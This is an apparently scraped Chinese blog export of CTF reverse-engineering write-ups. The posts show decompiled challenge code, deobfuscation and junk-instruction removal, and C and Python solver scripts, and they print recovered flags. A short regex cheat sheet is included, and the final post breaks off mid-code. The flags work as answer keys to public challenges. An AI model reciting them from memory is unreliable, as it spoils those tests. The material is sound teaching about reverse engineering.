\u0026quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026quot; new_table = \u0026quot;AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0987654321/+\u0026quot; enc = \u0026quot;mTyqm7wjODkrNLcWl0eqO8K8gc1BPk1GNLgUpI==\u0026quot; table = str.maketrans(new_table, standard_table) print(base64.b64decode(enc.translate(table))) b\u0026rsquo;flag{Special_Base64_By_Lich}'\n[WUSTCTF2020]level4 这道题是个体力活\nmain函数\nint __cdecl main(int argc, const char **argv, const char **envp) { puts(\u0026quot;Practice my Data Structure code.....\u0026quot;); puts(\u0026quot;Typing....Struct.....char....*left....*right............emmmmm...OK!\u0026quot;); init(); puts(\u0026quot;Traversal!\u0026quot;); printf(\u0026quot;Traversal type 1:\u0026quot;); midTraversal((char *)\u0026amp;node_23_root); printf(\u0026quot;\\nTraversal type 2:\u0026quot;); lastTraversal((char *)\u0026amp;node_23_root); printf(\u0026quot;\\nTraversal type 3:\u0026quot;); puts(\u0026quot; //type3(\u0026amp;x[22]); No way!\u0026quot;); puts(\u0026amp;byte_400A37); return 0; } 已知二叉树的中序遍历和后序遍历（运行即可得到），求先序遍历 2f0t02T{hcsiI_SwA__r7Ee} 20f0Th{2tsIS_icArE}e7__w 但由于中间有重复字符，搞了一会没搞出来，转而去看init函数，即二叉树的构建过程，这里需要手动修一下结构体，最终效果 void init() { int i; // [rsp+Ch] [rbp-34h] char v1[40]; // [rsp+10h] [rbp-30h] BYREF unsigned __int64 v2; // [rsp+38h] [rbp-8h] v2 = __readfsqword(0x28u); strcpy(v1, \u0026quot;I{_}Af2700ih_secTS2Et_wr\u0026quot;); for ( i = 0; i \u0026lt;= 23; ++i ) *((_BYTE *)\u0026amp;node_1.val + 24 * i) = v1[i]; node_23_root.left = \u0026amp;node_16; node_16.left = \u0026amp;node_21; node_21.left = \u0026amp;node_6; node_6.left = \u0026amp;node_7; node_6.right = \u0026amp;node_9; node_21.right = \u0026amp;node_19; node_19.left = \u0026amp;node_10; node_19.right = \u0026amp;node_2; node_2.left = \u0026amp;node_17; node_2.right = \u0026amp;node_12; node_16.right = \u0026amp;node_11; node_11.left = \u0026amp;node_14; node_11.right = \u0026amp;node_3; node_3.left = \u0026amp;node_1; node_3.right = \u0026amp;node_18; node_23_root.right = \u0026amp;node_22; node_22.left = \u0026amp;node_5; node_22.right = \u0026amp;node_13; node_13.right = \u0026amp;node_8; node_8.left = \u0026amp;node_24; node_8.right = \u0026amp;node_15; node_15.left = \u0026amp;node_20; node_15.right = \u0026amp;node_4; } 结构体如下，val的大小可以观察一下汇编中的数据得到 struct Tree { __int64 val; Tree *left; Tree *right; }; 根据只有左右节点，没有父节点的特点可以确定23号为root\n然后建立整棵树\nw/23 c/16 _/22 t/21 i/11 A/5 _/13 f/6 2/19 s/14 _3 78 2/7 0/9 0/10 {/2 I/1 S/18 r/24 e/15 T/17 h/12 E/20 }/4 先序遍历走一下拿到flagwctf2020{This_IS_A_7reE}\n[网鼎杯 2020 青龙组]singal 主要函数如下\nvoid __cdecl vm_operad(int *a1, int const_114) { char flag[200]; // [esp+13h] [ebp-E5h] BYREF char v3; // [esp+DBh] [ebp-1Dh] int v4; // [esp+DCh] [ebp-1Ch] int v5; // [esp+E0h] [ebp-18h] int v6; // [esp+E4h] [ebp-14h] int flag_cnt; // [esp+E8h] [ebp-10h] int a1_cnt; // [esp+ECh] [ebp-Ch] a1_cnt = 0; flag_cnt = 0; v6 = 0; v5 = 0; v4 = 0; LABEL_2: while ( a1_cnt \u0026lt; const_114 ) { switch ( a1[a1_cnt] ) { case 1: flag[v5 + 100] = v3; ++a1_cnt; ++v5; ++flag_cnt; break; case 2: v3 = a1[a1_cnt + 1] + flag[flag_cnt]; a1_cnt += 2; break; case 3: v3 = flag[flag_cnt] - LOBYTE(a1[a1_cnt + 1]); a1_cnt += 2; break; case 4: v3 = a1[a1_cnt + 1] ^ flag[flag_cnt]; a1_cnt += 2; break; case 5: v3 = a1[a1_cnt + 1] * flag[flag_cnt]; a1_cnt += 2; break; case 6: ++a1_cnt; break; case 7: if ( flag[v6 + 100] != a1[a1_cnt + 1] ) { printf(\u0026quot;what a shame...\u0026quot;); exit(0); } ++v6; a1_cnt += 2; break; case 8: flag[v4] = v3; ++a1_cnt; ++v4; break; case 10: read(flag); ++a1_cnt; break; case 11: v3 = flag[flag_cnt] - 1; ++a1_cnt; break; case 12: v3 = flag[flag_cnt] + 1; ++a1_cnt; break; default: goto LABEL_2; } } } a1是前面初始化时生成的一个表，可以看出全程不会改变\n变量值都是已知的，求flag\n目的简单明确，把它逆了，但有很多细节问题\na1里存的并非全是操作数，有些是需要参与运算的值，上一步的操作决定步长（即下一步的操作），逆过来的时候无法判断步长(即a1_cnt是减1还是减2)\nv3，v4，v5，v6的结束值即逆写的初值需要确定\ndefault里goto label_2需要明白其实没啥用\n针对以上解决方案（可能不是最优\n所有操作后步长(a1_cnt)均设置成最小步长-1，然后加一个判断，是否是真正的操作数，不是的话再a1_cnt-1\nv3分析一下会发现运行时会先被赋值后进行运算，所以无需初值。至于v4，v5，v6，这几个得自己数一遍，如果只是遍历一遍看进哪个case可能会把非操作数算上，还好数量不太大，最后数出来三个数都是15\n至于default正常运行是不会进去的，忽略即可\n最后贴出脚本，调试了好久才出，写得有点繁琐但不想改了（（\n#include \u0026lt;stdio.h\u0026gt; unsigned int a1[] = {};//这就是动调dump下来的a1数组，但太长了粘不下来 int a1_cnt = 112; int flag_cnt = 15; int v6 = 15; int v5 = 15; int v4 = 15; int const_114 = 114; unsigned char flag[200]; unsigned char v3; int main() { while (a1_cnt \u0026gt;= 0) { if (a1[a1_cnt - 1] \u0026gt;= 2 \u0026amp;\u0026amp; a1[a1_cnt - 1] \u0026lt;= 5) { // 这么判断可能换个数据就能卡掉，但显然这已经能拿到flag了 a1_cnt--; // 5 3 8 特判 if (a1[a1_cnt - 1] \u0026gt;= 2 \u0026amp;\u0026amp; a1[a1_cnt - 1] \u0026lt;= 5 \u0026amp;\u0026amp; a1[a1_cnt + 1] \u0026lt;= 12) a1_cnt++; } switch (a1[a1_cnt]) { case 1: --flag_cnt; --v5; --a1_cnt; v3 = flag[v5 + 100]; break; case 2: flag[flag_cnt] = v3 - a1[a1_cnt + 1]; a1_cnt--; break; case 3: flag[flag_cnt] = v3 + (a1[a1_cnt + 1] \u0026amp; 0x0000ffff); a1_cnt--; break; case 4: flag[flag_cnt] = v3 ^ a1[a1_cnt + 1]; a1_cnt--; break; case 5: flag[flag_cnt] = v3 / a1[a1_cnt + 1]; a1_cnt--; break; case 6: --a1_cnt; break; case 7: --v6; flag[v6 + 100] = a1[a1_cnt + 1]; a1_cnt--; break; case 8: --v4; --a1_cnt; v3 = flag[v4]; break; case 10: puts(flag); case 11: --a1_cnt; flag[flag_cnt] = v3 + 1; break; case 12: --a1_cnt; flag[flag_cnt] = v3 - 1; break; default: a1_cnt--; } } } flag{757515121f3d478}\n[GUET-CTF2019]number_game 第二次做这题了，发现了种非预期解（\nmain函数\nunsigned __int64 __fastcall main(int a1, char **a2, char **a3) { char *v4; // [rsp+8h] [rbp-38h] __int64 input; // [rsp+10h] [rbp-30h] BYREF __int16 v6; // [rsp+18h] [rbp-28h] char a1a[8]; // [rsp+20h] [rbp-20h] BYREF __int16 v8; // [rsp+28h] [rbp-18h] char v9; // [rsp+2Ah] [rbp-16h] unsigned __int64 v10; // [rsp+38h] [rbp-8h] v10 = __readfsqword(0x28u); input = 0LL; v6 = 0; *(_QWORD *)a1a = 0LL; v8 = 0; v9 = 0; __isoc99_scanf(\u0026quot;%s\u0026quot;, \u0026amp;input); if ( (unsigned int)check_len((const char *)\u0026amp;input) ) { v4 = sub_400758((char *)\u0026amp;input, 0, 10u); sub_400807(v4, a1a); v9 = 0; copy(a1a); if ( (unsigned int)sub_400917() ) { puts(\u0026quot;TQL!\u0026quot;); printf(\u0026quot;flag{\u0026quot;); printf(\u0026quot;%s\u0026quot;, (const char *)\u0026amp;input); puts(\u0026quot;}\u0026quot;); } else { puts(\u0026quot;your are cxk!!\u0026quot;); } } return __readfsqword(0x28u) ^ v10; } sub_400758 char *__fastcall sub_400758(char *input, int const_0, unsigned int len_input) { char v5; // [rsp+1Fh] [rbp-11h] char *v6; // [rsp+28h] [rbp-8h] v5 = input[const_0]; if ( v5 == ' ' || v5 == '\\n' || const_0 \u0026gt;= (int)len_input ) return 0LL; v6 = (char *)malloc(0x18uLL); *v6 = v5; *((_QWORD *)v6 + 1) = sub_400758(input, 2 * const_0 + 1, len_input); *((_QWORD *)v6 + 2) = sub_400758(input, 2 * (const_0 + 1), len_input); return v6; } sub_400807 void __fastcall sub_400807(char *a1, char *a2) { if ( a1 ) { sub_400807(*((char **)a1 + 1), a2); a2[dword_601080++] = *a1; sub_400807(*((char **)a1 + 2), a2); } } copy void __fastcall sub_400881(char *a1) { byte_601060[2] = *a1; byte_601060[7] = a1[1]; byte_601060[9] = a1[2]; byte_601060[11] = a1[3]; byte_601060[14] = a1[4]; byte_601060[15] = a1[5]; byte_601060[17] = a1[6]; byte_601060[18] = a1[7]; byte_601060[22] = a1[8]; byte_601060[23] = a1[9]; } sub_400917 __int64 sub_400917() { unsigned int v1; // [rsp+0h] [rbp-10h] int i; // [rsp+4h] [rbp-Ch] int j; // [rsp+8h] [rbp-8h] int k; // [rsp+Ch] [rbp-4h] v1 = 1; for ( i = 0; i \u0026lt;= 4; ++i ) { for ( j = 0; j \u0026lt;= 4; ++j ) { for ( k = j + 1; k \u0026lt;= 4; ++k ) { if ( byte_601060[5 * i + j] == byte_601060[5 * i + k] ) v1 = 0; if ( byte_601060[5 * j + i] == byte_601060[5 * k + i] ) v1 = 0; } } } return v1; } 从后往前看，sub_400917函数结合byte_601060发现是个5*5的数独，手动填一下 1 4 #0 2 3 3 0 #4 1 #2 0 #1 2 3 #4 #2 3 #1 #4 0 4 2 #3 #0 1 得到了主函数中的a1a 0421421430\n上面两个函数，将input逐层建了一个二叉树，然后再中序遍历赋值给ala\n正常做法是根据得到的ala即中序遍历建树，由于树从左到右生长，确保了答案的唯一性，这是我第一次做的时候的做法，如图\n1 1 3 4 2 4 0 0 2 4 //flag：1134240024 这次做突然有个大胆的想法，算法只是改变了数字的顺序，那么可不可能会在几次改变顺序后循环呢？于是有了以下尝试，每次将上一次动调得到的改变后的数组当作下一次的输入，幸运的是，第6次过后我就获得了成功，数据如下 0421421430 4134040221 2421104430 4134012024 0421404132 1134240024 0421421430 没有严谨的证明，但这确实不失为一种很高效的非预期解\nflag{1134240024}\n","id":25,"section":"posts","summary":"buuoj re wp CrackRTF ida定位main函数F5 int __cdecl main_0(int argc, const char **argv, const char **envp) { DWORD v3; // eax DWORD v4; // eax char Str[260]; // [esp+4Ch] [ebp-310h] BYREF int v7; // [esp+150h] [ebp-20Ch] char String1[260]; // [esp+154h] [ebp-208h] BYREF char Destination[260]; // [esp+258h] [ebp-104h] BYREF memset(Destination, 0, sizeof(Destination)); memset(String1, 0, sizeof(String1)); v7 = 0; printf(\u0026quot;pls input","tags":["CTF","reverse"],"title":"buu re wp","uri":"https://blog.dx39061.top/2022/02/buu-re-wp/","year":"2022"},{"content":"Regular Expression（linux） - 基本正则表达式 ^：匹配开头内容\n$：匹配结尾内容\n^$：表示空行\n.：匹配一个任意字符\n*：匹配出现次数为0次或多次\n^.*：匹配以任意多个字符开头的内容\n.*$：匹配以任意多个字符结尾的内容\n[abc]：匹配abc中任意一个字符\n[^abc]：匹配abc以外任意一个字符\n- 扩展正则表达式 +：匹配前一个字符1次或多次\n[abc]+：匹配abc中的一个字符一次或多次\n？：匹配前一个字符1次或者0次\n|：表示或者，或管道符\n{n,m}：匹配前一个字符最少n次，最多m次\n{n}：匹配前一个字符正好n次\n","id":26,"section":"posts","summary":"Regular Expression（linux） - 基本正则表达式 ^：匹配开头内容 $：匹配结尾内容 ^$：表示空行 .：匹配一个任意字符 *：匹配出现次数为0次","tags":["linux"],"title":"Regular Expression（linux）","uri":"https://blog.dx39061.top/2022/02/regular-expressionlinux/","year":"2022"},{"content":"第九周 0x00 Hacking with Google: Beginner 做了一半卡住了，偷看了一下官方题解，然后复现一下\nida很容易定位到主函数\nint __cdecl main(int argc, const char **argv, const char **envp) { int v3; // er12 __m128i v5; // [rsp+0h] [rbp-38h] BYREF __m128i s2[2]; // [rsp+10h] [rbp-28h] BYREF printf(\u0026quot;Flag: \u0026quot;); __isoc99_scanf(\u0026quot;%15s\u0026quot;, \u0026amp;v5); s2[0] = _mm_xor_si128( _mm_add_epi32(_mm_shuffle_epi8(_mm_load_si128(\u0026amp;v5), (__m128i)SHUFFLE), (__m128i)ADD32), (__m128i)XOR); if ( !strncmp(v5.m128i_i8, (const char *)s2, 0x10uLL) \u0026amp;\u0026amp; (v3 = strncmp((const char *)s2, EXPECTED_PREFIX, 4uLL)) == 0 ) { puts(\u0026quot;SUCCESS\u0026quot;); } else { v3 = 1; puts(\u0026quot;FAILURE\u0026quot;); } return v3; } 可以看到各种SSE指令\n这里要注意add是把每四字节打包（pack）然后进行求和，而异或是逐字节进行异或\n_mm_shuffle_epi8 无法见名知义，官方描述加查找各种解释终于搞懂，见注释\nFOR j := 0 to 15 //遍历16个字节 i := j*8 //遍历每个字节中的8个bit IF b[i+7] == 1 //当前字节最高位为1 dst[i+7:i] := 0 //整个字节8bit全置为0 ELSE index[3:0] := b[i+3:i] //相当于以int形式取出b中的值存入index dst[i+7:i] := a[index*8+7:index*8] //把a数组下标为index[i]的值放入dst数组 FI ENDFOR 由于可见字符为32-126，不可能最高位为1，所以全置为0的情况不会发生\n即shuffle就是把原数组a按b的顺序重新排列了一遍，其中值没有改变\n题目验证逻辑\nflag-\u0026gt;shuffle-\u0026gt;add-\u0026gt;xor == flag \u0026amp;\u0026amp; flag前四位为CTF{ （这里注意输入的第16位是字符串结束标志\\0\n显然我们可以根据前四位推出一些东西\n从后往前推\nflag 0x43 0x54 0x46 0x7b xornum 0x76 0x58 0xB4 0x49 xor_pre 0x35 0x0c 0xf2 0x32 xor_pre 0x32f20c35 addnum 0x0DEADBEEF add_pre 0x54444d46 add_pre 0x46 0x4d 0x44 0x54 shufflenum 2 6 7 1 于是我们知道了第6、7位分别为M、D，即CTF{--MD------}\\0\n这时我们想到，最低位（字节）的值进行add操作时不会受其他字节的影响（不会受进位的影响\n要确保已知字符是shuffle后的最低位，我们想到了\\0，并且这次需要正着推\n为省事写个脚本\n#include\u0026lt;stdio.h\u0026gt; int xornum[] = {0x76, 0x58, 0xB4, 0x49, 0x8D, 0x1A, 0x5F, 0x38, 0xD4, 0x23, 0xF8, 0x34, 0xEB, 0x86, 0xF9, 0xAA}; int addnum[] = {0xEF, 0xBE, 0xAD, 0xDE, 0xAD, 0xDE, 0xE1, 0xFE, 0x37, 0x13, 0x37, 0x13, 0x66, 0x74, 0x63, 0x67}; int shufflenum[] = {2,6,7,1,5,11,9,14,3,15,4,8,10,12,13,0}; int main(){ int alpha,index,pre_index; //index是shuffle之后的下标，pre_index是shuffle之前的下标 scanf(\u0026quot;%x%d\u0026quot;,\u0026amp;alpha,\u0026amp;index); for (int i = 0; i \u0026lt; 16; i++){ if(index==shufflenum[i]) pre_index = i; } unsigned char newalpha = ((alpha+addnum[pre_index]))^xornum[pre_index]; printf(\u0026quot;0x%x %c %d\u0026quot;,newalpha,newalpha,pre_index); } // input:0 15 // output:0x30 0 9 // input:0x7b 3 // output:0x66 f 8 于是得到了flag第九位为0，即CTF{--MD-0----}\\0\n同样用 { 可以得到第8位为 f，即CTF{--MDf0----}\\0\n但我们已经用完了所有的最低字节\n我们如果使用其他字节就会面临进位的问题，但我们也不排除还有其他没有使用的，没有进位的字符\n如果去考虑一遍所有的位是否存在进位问题是一个浩大的工程\n所以我们的想法是碰碰运气，如果推出的字符与已知矛盾就舍弃，如果不矛盾就保留（这真是官方方法\n在把所有位试过一遍之后，我们会逐渐得到flag\nCTF{--MDf0-M--}\\0 CTF{-1MDf0-M--}\\0 CTF{S1MDf0-M--}\\0 CTF{S1MDf0rM--}\\0 CTF{S1MDf0rM3-}\\0 CTF{S1MDf0rM3!}\\0 CTF{S1MDf0rM3!}\\0 0x01 V\u0026amp;N 公开赛 CSRe die查，发现protector: Eazfuscator\n查了一下，是一种.Net代码混淆方法，可以用de4dot反混淆，然后dnspy反编译\n这道题需要耐心，尝试搜索flag字符串，翻了十多分钟终于找到Main\nusing System; using System.Security.Cryptography; using System.Text; // Token: 0x02000006 RID: 6 internal sealed class Class3 { // Token: 0x0600000D RID: 13 RVA: 0x000022C8 File Offset: 0x000004C8 public string method_0(string string_0, string string_1) { string text = string.Empty; char[] array = string_0.ToCharArray(); char[] array2 = string_1.ToCharArray(); int num = (array.Length \u0026lt; array2.Length) ? array.Length : array2.Length; for (int i = 0; i \u0026lt; num; i++) { text += (int)(array[i] ^ array2[i]); } return text; } // Token: 0x0600000E RID: 14 RVA: 0x0000231C File Offset: 0x0000051C public static string smethod_0(string string_0) { byte[] bytes = Encoding.UTF8.GetBytes(string_0); byte[] array = SHA1.Create().ComputeHash(bytes); StringBuilder stringBuilder = new StringBuilder(); foreach (byte b in array) { stringBuilder.Append(b.ToString(\u0026quot;X2\u0026quot;)); } return stringBuilder.ToString(); } // Token: 0x0600000F RID: 15 RVA: 0x00002374 File Offset: 0x00000574 private static void Main(string[] args) { if (!Class1.smethod_1()) { return; } bool flag = true; Class3 @class = new Class3(); string str = Console.ReadLine(); if (Class3.smethod_0(\u0026quot;3\u0026quot; + str + \u0026quot;9\u0026quot;) != \u0026quot;B498BFA2498E21325D1178417BEA459EB2CD28F8\u0026quot;) { flag = false; } string text = Console.ReadLine(); string string_ = Class3.smethod_0(\u0026quot;re\u0026quot; + text); string text2 = @class.method_0(string_, \u0026quot;63143B6F8007B98C53CA2149822777B3566F9241\u0026quot;); for (int i = 0; i \u0026lt; text2.Length; i++) { if (text2[i] != '0') { flag = false; } } if (flag) { Console.WriteLine(\u0026quot;flag{\u0026quot; + str + text + \u0026quot;}\u0026quot;); } } } 可以看到flag由两部分组成，即str和text\nclass。method_0像是个加密算法，得到两串字符串\n直接丢到Cmd5网站解密，原来是Sha1加密\n得到\u0026quot;3\u0026quot; + str + \u0026quot;9\u0026quot;==314159,\u0026quot;re\u0026quot; + text ==return\n故flag{1415turn}\n0x02 Zer0pts2020 easy-strcmp ida载入，main函数\n__int64 __fastcall main(int a1, char **a2, char **a3) { if ( a1 \u0026gt; 1 ) { if ( !strcmp(a2[1], \u0026quot;zer0pts{********CENSORED********}\u0026quot;) ) puts(\u0026quot;Correct!\u0026quot;); else puts(\u0026quot;Wrong!\u0026quot;); } else { printf(\u0026quot;Usage: %s \u0026lt;FLAG\u0026gt;\\n\u0026quot;, *a2); } return 0LL; } 醒目的strcmp和一串字符串，难道这就是flag？肯定不是\n翻函数列表发现两个特别的函数\nint (**sub_563477E00795())(const char *s1, const char *s2) { int (**result)(const char *, const char *); // rax result = \u0026amp;strcmp; qword_563478001090 = (__int64 (__fastcall *)(_QWORD, _QWORD))\u0026amp;strcmp; off_563478001028 = sub_563477E006EA; return result; } __int64 __fastcall sub_563477E006EA(__int64 a1, __int64 a2) { int i; // [rsp+18h] [rbp-8h] int v4; // [rsp+18h] [rbp-8h] int j; // [rsp+1Ch] [rbp-4h] for ( i = 0; *(_BYTE *)(i + a1); ++i ) ; v4 = (i \u0026gt;\u0026gt; 3) + 1; for ( j = 0; j \u0026lt; v4; ++j ) *(_QWORD *)(8 * j + a1) -= qword_563478001060[j]; return qword_563478001090(a1, a2); } 可以看到第一个函数sub_563477E00795记录了strcmp函数的地址，然后调用了函数sub_563477E006EA\n相当于把strcmp函数给改了，实际执行的是第二个函数sub_563477E006EA\n即把真正的flag加密了，然后与main函数里的字符串比较\n这里注意main函数里传的是 a2[1]，即跳过了zer0pts\nqword_563478001060刚好32个字节非空，对应修改 * 及其中间字符共32个字节\n于是写脚本拿flag\n#include\u0026lt;stdio.h\u0026gt; unsigned char key[] = { 0x42, 0x09, 0x4A, 0x49, 0x35, 0x43, 0x0A, 0x41, 0xF0, 0x19, 0xE6, 0x0B, 0xF5, 0xF2, 0x0E, 0x0B, 0x2B, 0x28, 0x35, 0x4A, 0x06, 0x3A, 0x0A, 0x4F }; char en_flag[]=\u0026quot;********CENSORED********\u0026quot;; unsigned long long flag[5]; int main(){ for(int i=0;i\u0026lt;3;i++){ flag[i]=*((unsigned long long *)key+i)+*((unsigned long long *)en_flag+i); } for(int i=0;i\u0026lt;24;i++){ printf(\u0026quot;%c\u0026quot;,*((unsigned char *)flag+i)); } } //zer0pts{l3ts_m4k3_4_DETOUR_t0d4y} 刚开始还犯了错误，逐字节解密得到错误flag：l3ts_m4k3^4^DDSOUR_t0d4y\n因为题目是将每8字节打包进行加法，其中有进位，而逐字节加法不会产生进位，所以出了问题\n第八周 0x00 大佬喝茶~ 偷懒没有管花指令\nida载入，进main函数\n__int64 __fastcall main(int a1, char **a2, char **a3) { int j; // [rsp+14h] [rbp-7Ch] int i; // [rsp+18h] [rbp-78h] char input[48]; // [rsp+20h] [rbp-70h] BYREF char v7[32]; // [rsp+50h] [rbp-40h] BYREF __int64 v8[4]; // [rsp+70h] [rbp-20h] BYREF v8[3] = __readfsqword(0x28u); v8[0] = 0x4837F6D54BAA4D13LL; v8[1] = 0x203F4E88752F3489LL; printf(\u0026quot;Hello there. Plz Input your flag: \u0026quot;); __isoc99_scanf(\u0026quot;%40s\u0026quot;, input); if ( strlen(input) != 32 ) { printf(\u0026quot;nope\\n\u0026quot;); exit(0); } for ( i = 0; i \u0026lt; 32; ++i ) v7[i] = input[i]; ((void (__fastcall *)(__int64 *, char *, __int64))sub_1180)(v8, v7, 4LL); for ( j = 0; j \u0026lt; 32; ++j ) { if ( (unsigned __int8)v7[j] != en_flag[j] ) { printf(\u0026quot;nope\\n\u0026quot;); exit(0); } } printf(\u0026quot;you are right!\\n\u0026quot;); return 0LL; } 可以看出就是把input复制给v7然后经sub_1180函数加密然后和en_flag比较\n跟进sub_1180\n__int64 __fastcall sub_1180(unsigned int *a1, __int64 a2, unsigned int a3) { unsigned int v4; // [rsp+0h] [rbp-4Ch] unsigned int v5; // [rsp+4h] [rbp-48h] unsigned int v6; // [rsp+8h] [rbp-44h] unsigned int v7; // [rsp+Ch] [rbp-40h] unsigned int j; // [rsp+14h] [rbp-38h] unsigned int i; // [rsp+18h] [rbp-34h] int v10; // [rsp+1Ch] [rbp-30h] unsigned int v11; // [rsp+20h] [rbp-2Ch] unsigned int v12; // [rsp+24h] [rbp-28h] v7 = _byteswap_ulong(*a1); v6 = _byteswap_ulong(a1[1]); v5 = _byteswap_ulong(a1[2]); v4 = _byteswap_ulong(a1[3]); for ( i = 0; i \u0026lt; a3; ++i ) { v10 = 0; v12 = *(unsigned __int8 *)(a2 + 8 * i + 3) | (*(unsigned __int8 *)(a2 + 8 * i + 2) \u0026lt;\u0026lt; 8) | (*(unsigned __int8 *)(a2 + 8 * i + 1) \u0026lt;\u0026lt; 16) | (*(unsigned __int8 *)(a2 + 8 * i) \u0026lt;\u0026lt; 24); v11 = *(unsigned __int8 *)(a2 + 8 * i + 7) | (*(unsigned __int8 *)(a2 + 8 * i + 6) \u0026lt;\u0026lt; 8) | (*(unsigned __int8 *)(a2 + 8 * i + 5) \u0026lt;\u0026lt; 16) | (*(unsigned __int8 *)(a2 + 8 * i + 4) \u0026lt;\u0026lt; 24); for ( j = 0; j \u0026lt; 0x20; ++j ) { v10 -= 1640531527; v12 += (v6 + (v11 \u0026gt;\u0026gt; 5)) ^ (v10 + v11) ^ (v7 + 16 * v11); v11 += (v4 + (v12 \u0026gt;\u0026gt; 5)) ^ (v10 + v12) ^ (v5 + 16 * v12); } *(_BYTE *)(a2 + 8 * i) = HIBYTE(v12); *(_BYTE *)(a2 + 8 * i + 1) = BYTE2(v12); *(_BYTE *)(a2 + 8 * i + 2) = BYTE1(v12); *(_BYTE *)(a2 + 8 * i + 3) = v12; *(_BYTE *)(a2 + 8 * i + 4) = HIBYTE(v11); *(_BYTE *)(a2 + 8 * i + 5) = BYTE2(v11); *(_BYTE *)(a2 + 8 * i + 6) = BYTE1(v11); *(_BYTE *)(a2 + 8 * i + 7) = v11; } return 0LL; } 能看出来就是tea加密\n_byteswap_ulong这个细节需要注意，用处是把参数值以字节为单位颠倒前后顺序，也可以直接动调得到，即为key密钥\n写脚本拿flag\n#include\u0026lt;stdio.h\u0026gt; unsigned char en_flag[32] ={104,16,10,183,126,253,224,41,184,177,19,193,252,91,54,195,103,70,92,25,222,185,88,154,107,135,19,206,70,106,56,107}; // int key[]={0x4BAA4D13,0x4837F6D5,0x752F3489,0x203F4E88}; unsigned int key[]={0x134daa4b,0xd5f63748,0x89342f75,0x884e3f20}; int delta =0x61C88647,v9; unsigned char flag[100]; unsigned int v10,v11; int main(){ for(int i=0;i\u0026lt;4;i++){ *((char *)\u0026amp;v11+3)=*(en_flag + 8 * i); *((char *)\u0026amp;v11+2)=*(en_flag + 8 * i+1); *((char *)\u0026amp;v11+1)=*(en_flag + 8 * i+2); *((char *)\u0026amp;v11)=*(en_flag + 8 * i+3); *((char *)\u0026amp;v10+3)=*(en_flag + 8 * i+4); *((char *)\u0026amp;v10+2)=*(en_flag + 8 * i+5); *((char *)\u0026amp;v10+1)=*(en_flag + 8 * i+6); *((char *)\u0026amp;v10)=*(en_flag + 8 * i+7); for(int j=0x20-1;j\u0026gt;=0;j--){ v9=(j+1)*delta*(-1); v10 -= (key[3] + (v11 \u0026gt;\u0026gt; 5)) ^ (v9 + v11) ^ (key[2] + 16 * v11); v11 -= (key[1] + (v10 \u0026gt;\u0026gt; 5)) ^ (v9 + v10) ^ (key[0] + 16 * v10); } *(flag + 8 * i) = *((char *)\u0026amp;v11+3); *(flag + 8 * i + 1) = *((char *)\u0026amp;v11+2); *(flag + 8 * i + 2) = *((char *)\u0026amp;v11+1); *(flag + 8 * i + 3) = *((char *)\u0026amp;v11); *(flag + 8 * i + 4) = *((char *)\u0026amp;v10+3); *(flag + 8 * i + 5) = *((char *)\u0026amp;v10+2); *(flag + 8 * i + 6) = *((char *)\u0026amp;v10+1); *(flag + 8 * i + 7) = *((char *)\u0026amp;v10); } puts(flag); } //19d9346d-410a-441f-b14e-9a60bb05 0x01 N1CTF oflo 太难啦~ 根据RX的wp复现还遇到了好多问题（（\nida打开只能看到start函数，点开offset main看到main函数全是红的，分析错误\n400BB1 jmp那一行明显有花指令，loc_400BB1自己跳到自己，先按u取消定义，BB2那一行按c转换为code，BB1patch成nop\nBB7跳转到loc_400BBF，然后胡乱操作一通就retn了\n因为return以后要执行BBC这一行，所以BBC这一行应该也是花指令\n按u取消定义，把BBC patch掉，剩下两行转换成code，400CBA那一行同理\n400D04和上面BB1同理，一样搞掉\nD14下面这几行一堆乱数据，不知道有没有用，先不管\n回到main函数开头按p创建函数，成功，F5却出现报错\n是sp指针出了问题，可以通过Options-\u0026gt;General-\u0026gt;Disassembly右边勾上stack pointer\n可以明显看到loc_400BBF函数中的sp指针值出了问题\n这样看来，这个函数就是为了扰乱sp存在的，直接从BB7到BD0全patch掉\n同理CB5到CCE也全patch掉\n但这时ida把main函数断在了CB9这一行\n可以回到main函数开始按u取消定义，然后按c重新转换为code\n然后终于可以快乐地F5了,main函数真容：\nvoid __fastcall __noreturn main(int a1, char **a2, char **a3) { int i; // [rsp+4h] [rbp-23Ch] __int64 input[4]; // [rsp+10h] [rbp-230h] BYREF char v5[520]; // [rsp+30h] [rbp-210h] BYREF unsigned __int64 v6; // [rsp+238h] [rbp-8h] v6 = __readfsqword(0x28u); memset(v5, 0, 512uLL); input[0] = 0LL; input[1] = 0LL; input[2] = 0LL; input[3] = 0LL; if ( (unsigned int)sub_4008B9((__int64)v5) == -1 ) exit(0LL); read(0LL, input, 19LL); qword_602048 = (__int64)sub_400A69; mprotect((unsigned int)main \u0026amp; 0xFFFFC000, 0x10uLL, 7uLL); for ( i = 0; i \u0026lt;= 9; ++i ) *(_BYTE *)(qword_602048 + i) ^= *((_BYTE *)input + i % 5); if ( (unsigned int)sub_400A69((int)v5, (__int64)input + 5, (unsigned __int16)v5) ) write(1LL, \u0026quot;Cong!\\n\u0026quot;, 6LL); exit(0LL); } 17行创建了一个sub_400A69函数段的指针\n18行mprotect函数将sub_400A69段代码的权限改为7（即rwx）\n然后20行修改了sub_400A69的代码，与input前5位（n1ctf）异或，即SMC，先写个脚本还原一下正确的代码\nfrom ida_bytes import * key = \u0026quot;n1ctf\u0026quot; for i in range(10): patch_byte(0x400A69+i,get_byte(0x400A69+i)^ord(key[i%5])) 还原之后F5还是失败，原因是有和main函数一样的花指令和扰乱sp的代码，一样处理后得到函数\n__int64 __fastcall sub_400A69(__int64 a1, __int64 a2) { __int64 v2; // rbp int i; // [rsp+14h] [rbp-2Ch] char v5[14]; // [rsp+18h] [rbp-28h] BYREF unsigned __int64 v6; // [rsp+30h] [rbp-10h] __int64 v7; // [rsp+38h] [rbp-8h] v7 = v2; v6 = __readfsqword(0x28u); v5[0] = 53; v5[1] = 45; v5[2] = 17; v5[3] = 26; v5[4] = 73; v5[5] = 125; v5[6] = 17; v5[7] = 20; qmemcpy(\u0026amp;v5[8], \u0026quot;+;\u0026gt;=\u0026lt;_\u0026quot;, 6); for ( i = 0; i \u0026lt;= 13; ++i ) { if ( v5[i] != ((*(char *)(i + a1) + 2) ^ *(char *)(i + a2)) ) return 0LL; } return 1LL; } 重新进main函数看一下传进来的参数，这里需要再按一下F5，让ida根据修复后的代码重新分析一下\nvoid __fastcall __noreturn main(int a1, char **a2, char **a3) { int i; // 